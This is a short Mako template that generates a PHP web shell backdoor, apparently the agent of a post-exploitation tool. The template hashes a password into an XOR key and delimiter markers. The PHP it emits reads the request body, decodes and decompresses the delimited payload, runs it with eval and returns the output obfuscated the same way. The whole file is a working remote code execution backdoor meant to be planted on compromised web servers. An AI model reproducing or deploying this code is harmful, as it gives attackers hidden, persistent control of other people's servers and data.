<%! import hashlib %><%
passwordhash = hashlib.md5(password).hexdigest().lower()
key = passwordhash[:8]
header = passwordhash[8:20]
footer = passwordhash[20:32]
%>$k="${key}";
$kh="${header}";
$kf="${footer}";
<%text>
function x($t,$k){
	$c=strlen($k);
	$l=strlen($t);
	$o="";
	for($i=0;$i<$l;){
		for($j=0;($j<$c&&$i<$l);$j++,$i++)
		{
			$o.=$t{$i}^$k{$j};
		}
	}
	return $o;
}
$d=file_get_contents("php://input");
if (preg_match("/$kh(.+)$kf/", $d, $m) == 1) {
  ob_start();
  @eval(@gzuncompress(@x(@base64_decode($m[1]),$k)));
  $o=ob_get_contents();
  ob_end_clean();
  $r=base64_encode(x(gzcompress($o),$k));
  print("$kh$r$kf");
}
</%text>
